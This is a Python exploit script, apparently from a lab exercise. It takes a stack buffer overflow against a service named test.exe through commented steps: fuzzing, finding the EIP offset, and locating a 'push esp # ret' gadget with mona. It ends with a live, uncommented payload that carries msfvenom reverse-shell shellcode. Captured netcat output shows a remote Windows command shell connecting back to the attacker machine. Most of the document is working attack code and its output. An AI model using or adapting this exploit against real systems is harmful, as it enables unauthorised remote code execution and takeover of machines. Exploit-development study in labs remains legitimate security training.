#!/usr/bin/python

#/////////////////////////////////////// Step 1 ////////////////////////////////////////////

# import socket

# payload =  "A"*500
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect(("192.168.234.140", 69))
# s.recv(5000)
# s.send("cmd" + " " + payload)
# data = s.recv(5000)
# print(data)
# s.close()


#root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
#Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq

#/////////////////////////////////////// Step 2 ////////////////////////////////////////////

# import socket

# payload =  "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect(("192.168.234.140", 69))
# s.recv(5000)
# s.send("cmd" + " " + payload)
# data = s.recv(5000)
# print(data)
# s.close()

#EIP = 65413565

# root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 500 -q 65413565
# [*] Exact match at offset 136

#/////////////////////////////////////// Step 3 ////////////////////////////////////////////

# import socket

# payload =  "A"*136 + "B"*4 + "C"*600
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect(("192.168.234.140", 69))
# s.recv(5000)
# s.send("cmd" + " " + payload)
# data = s.recv(5000)
# print(data)
# s.close()

#EIP = 42424242

#/////////////////////////////////////// Step 4 ////////////////////////////////////////////

#If using mona with immunity
#!mona modules
#!mona find -type instr -s "jmp esp" -m test.exe
# or
# !mona jmp -r esp
# 0BADF00D       - Number of pointers of type 'jmp esp' : 1
# 0BADF00D       - Number of pointers of type 'push esp # ret ' : 3
# 0BADF00D   [+] Results :
# 00401356     0x00401356 : jmp esp | startnull,ascii {PAGE_EXECUTE_READ} [test.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\researcher\Desktop\test.exe)
# 610B79A5     0x610b79a5 : push esp # ret  |  {PAGE_EXECUTE_READ} [cygwin1.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.7.9 (C:\Users\researcher\Desktop\cygwin1.dll)
# 610B7A6D     0x610b7a6d : push esp # ret  | ascii {PAGE_EXECUTE_READ} [cygwin1.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.7.9 (C:\Users\researcher\Desktop\cygwin1.dll)
# 610B7AE1     0x610b7ae1 : push esp # ret  |  {PAGE_EXECUTE_READ} [cygwin1.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.7.9 (C:\Users\researcher\Desktop\cygwin1.dll)
# 0BADF00D       Found a total of 4 pointers




# import socket
# import struct

# payload =  "A"*136 
# payload += struct.pack("<I", 0x610B79A5)
# # payload += "B"*4
# # payload += struct.pack("<I", 0x00402147)
# payload += "\x90"*600
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect(("192.168.234.140", 69))
# s.recv(5000)
# s.send("cmd" + " " + payload)
# data = s.recv(5000)
# print(data)
# s.close()


#/////////////////////////////////////// Step 5 ////////////////////////////////////////////

# msfvenom -a x86 -b "\x00" -p windows/shell_reverse_tcp lhost=192.168.234.141 lport=4444 -f c
# https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html

#This will pop calc

# import socket
# import struct

# payload =  "A"*136 
# payload += struct.pack("<I", 0x610B79A5)
# # payload += "B"*4
# # payload += struct.pack("<I", 0x00402147)
# # payload += "\x90"*600
# payload += ( 
# "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f" +
# "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b" +
# "\x77\x20\x8b\x3f\x80\x7e\x0c\x33" +
# "\x75\xf2\x89\xc7\x03\x78\x3c\x8b" +
# "\x57\x78\x01\xc2\x8b\x7a\x20\x01" +
# "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6" +
# "\x45\x81\x3e\x43\x72\x65\x61\x75" +
# "\xf2\x81\x7e\x08\x6f\x63\x65\x73" +
# "\x75\xe9\x8b\x7a\x24\x01\xc7\x66" +
# "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7" +
# "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9" +
# "\xb1\xff\x53\xe2\xfd\x68\x63\x61" +
# "\x6c\x63\x89\xe2\x52\x52\x53\x53" +
# "\x53\x53\x53\x53\x52\x53\xff\xd7" 
# )
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect(("192.168.234.140", 69))
# s.recv(5000)
# s.send("cmd" + " " + payload)
# data = s.recv(5000)
# print(data)
# s.close()



# root@kali:~# msfvenom -a x86 -b "\x00" -p windows/shell_reverse_tcp lhost=192.168.234.141 lport=4444 -f c -e x86/call4_dword_xor

import socket
import struct

payload =  "A"*136 
payload += struct.pack("<I", 0x610B79A5)
payload += ( 
"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e" +
"\x40\xfa\x90\x7a\x83\xee\xfc\xe2\xf4\xbc\x12\x12\x7a\x40\xfa" +
"\xf0\xf3\xa5\xcb\x50\x1e\xcb\xaa\xa0\xf1\x12\xf6\x1b\x28\x54" +
"\x71\xe2\x52\x4f\x4d\xda\x5c\x71\x05\x3c\x46\x21\x86\x92\x56" +
"\x60\x3b\x5f\x77\x41\x3d\x72\x88\x12\xad\x1b\x28\x50\x71\xda" +
"\x46\xcb\xb6\x81\x02\xa3\xb2\x91\xab\x11\x71\xc9\x5a\x41\x29" +
"\x1b\x33\x58\x19\xaa\x33\xcb\xce\x1b\x7b\x96\xcb\x6f\xd6\x81" +
"\x35\x9d\x7b\x87\xc2\x70\x0f\xb6\xf9\xed\x82\x7b\x87\xb4\x0f" +
"\xa4\xa2\x1b\x22\x64\xfb\x43\x1c\xcb\xf6\xdb\xf1\x18\xe6\x91" +
"\xa9\xcb\xfe\x1b\x7b\x90\x73\xd4\x5e\x64\xa1\xcb\x1b\x19\xa0" +
"\xc1\x85\xa0\xa5\xcf\x20\xcb\xe8\x7b\xf7\x1d\x92\xa3\x48\x40" +
"\xfa\xf8\x0d\x33\xc8\xcf\x2e\x28\xb6\xe7\x5c\x47\x05\x45\xc2" +
"\xd0\xfb\x90\x7a\x69\x3e\xc4\x2a\x28\xd3\x10\x11\x40\x05\x45" +
"\x2a\x10\xaa\xc0\x3a\x10\xba\xc0\x12\xaa\xf5\x4f\x9a\xbf\x2f" +
"\x07\x10\x45\x92\x50\xd2\xaa\x77\xf8\x78\x40\xeb\xcc\xf3\xa6" +
"\x90\x80\x2c\x17\x92\x09\xdf\x34\x9b\x6f\xaf\xc5\x3a\xe4\x76" +
"\xbf\xb4\x98\x0f\xac\x92\x60\xcf\xe2\xac\x6f\xaf\x28\x99\xfd" +
"\x1e\x40\x73\x73\x2d\x17\xad\xa1\x8c\x2a\xe8\xc9\x2c\xa2\x07" +
"\xf6\xbd\x04\xde\xac\x7b\x41\x77\xd4\x5e\x50\x3c\x90\x3e\x14" +
"\xaa\xc6\x2c\x16\xbc\xc6\x34\x16\xac\xc3\x2c\x28\x83\x5c\x45" +
"\xc6\x05\x45\xf3\xa0\xb4\xc6\x3c\xbf\xca\xf8\x72\xc7\xe7\xf0" +
"\x85\x95\x41\x60\xcf\xe2\xac\xf8\xdc\xd5\x47\x0d\x85\x95\xc6" +
"\x96\x06\x4a\x7a\x6b\x9a\x35\xff\x2b\x3d\x53\x88\xff\x10\x40" +
"\xa9\x6f\xaf"
)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.234.140", 69))
s.recv(5000)
s.send("cmd" + " " + payload)
data = s.recv(5000)
print(data)
s.close()


# root@kali:~# nc -lvvv -p 4444
# listening on [any] 4444 ...
# 192.168.234.140: inverse host lookup failed: Unknown host
# connect to [192.168.234.141] from (UNKNOWN) [192.168.234.140] 55621
# Microsoft Windows [Version 6.1.7601]
# Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

# C:\Users\researcher\Desktop\overflow>











